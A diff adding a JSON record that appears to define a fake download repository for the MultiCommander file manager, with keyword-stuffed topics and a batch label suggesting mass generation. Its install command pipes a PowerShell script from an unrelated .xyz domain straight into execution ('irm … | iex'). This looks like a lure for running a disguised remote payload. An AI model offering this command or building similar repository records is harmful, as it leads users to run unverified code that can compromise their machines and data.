@@ -1,0 +1,29 @@
+{
+  "repo": "multicommander-tabbed-file-manager",
+  "product": "MultiCommander Tabbed File Manager",
+  "kind": "productivity",
+  "install_type": "download",
+  "download_url": "https://multicommander.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "productivity",
+  "topics": [
+    "multicommander-bundle",
+    "multicommander-platform",
+    "multicommander-file-manager",
+    "multicommander-64-bit",
+    "multicommander-startup-fix",
+    "multicommander-pc-install",
+    "multicommander-desktop-launcher",
+    "multicommander-workbench",
+    "multicommander-user-guide",
+    "multicommander-manual-2026",
+    "multicommander-installer",
+    "productivity-tools",
+    "win-tools",
+    "system-utility",
+    "windows-tools"
+  ]
+}
